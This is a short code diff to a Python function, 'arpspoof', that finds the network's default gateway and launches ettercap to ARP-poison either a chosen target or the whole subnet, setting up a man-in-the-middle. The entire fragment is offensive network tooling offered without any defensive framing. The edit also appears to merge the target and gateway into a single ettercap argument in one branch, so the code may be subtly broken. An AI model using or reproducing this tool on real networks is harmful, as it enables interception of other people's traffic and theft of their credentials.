@@ -11,9 +11,9 @@ def arpspoof(target = None):
     gateway = gws['default'][netifaces.AF_INET][0]
     print("Using gateway " + gateway)
     if target is None:
-        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///" "/"+gateway+"//"])
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///", "/"+gateway+"//"])
     else:
-        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//", "/"+gateway+"//"])
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//" + "/"+gateway+"//"])
     return spoofer
 
 
